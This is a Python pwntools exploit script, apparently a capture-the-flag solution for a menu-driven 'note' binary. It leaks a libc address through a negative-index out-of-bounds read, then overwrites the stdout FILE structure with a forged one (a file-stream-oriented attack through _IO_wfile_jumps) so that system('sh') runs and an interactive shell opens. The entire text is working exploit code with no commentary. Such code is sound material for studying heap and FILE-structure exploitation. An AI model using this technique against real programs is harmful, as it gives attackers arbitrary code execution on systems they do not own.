from pwn import *
context(arch='amd64')

p = process('./note', env={'LD_PRELOAD' : './libc.so.6'})
libc = ELF('./libc.so.6',checksec=False)

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def create(idx, author, size, content) :
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b"Page number (0 ~ 7): ", str(idx).encode())
    p.sendafter(b"Author: ", author);
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Content: ", content)

def show(idx) :
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b"Index: ", str(idx).encode())

def edit(idx, content) :
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendafter(b"New content: ", content)

create(0, b'A', 10, b'B')
show(-8)
p.recvuntil(b"Size: ")
libc_base = int(p.recvline()[:-1]) - 0x21b803
stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
system = libc_base + libc.symbols['system']
io_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']

print("[+] libc_base :", hex(libc_base))
print("[+] stdout :", hex(stdout))
print("[+] system :", hex(system))
print("[+] io_wfile_jumps :", hex(io_wfile_jumps))

fs = FileStructure(0)
marker = u64(b'CAFEBABE')
fs._IO_save_end = marker
_IO_save_end_off = bytes(fs) .index(p64(marker))

FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
                   lock            = stdout + 0x10, \
                   _IO_read_ptr    = 0x0, \
                   _IO_write_base  = 0x0, \
                   _wide_data      = stdout - 0x10, \
                   _unused2        = p64(system)+ b"\x00"*4 + p64(stdout + _IO_save_end_off + 4), \
                   vtable          = io_wfile_jumps - 0x20, \
                   )

edit(-16, FSOP)

p.interactive()
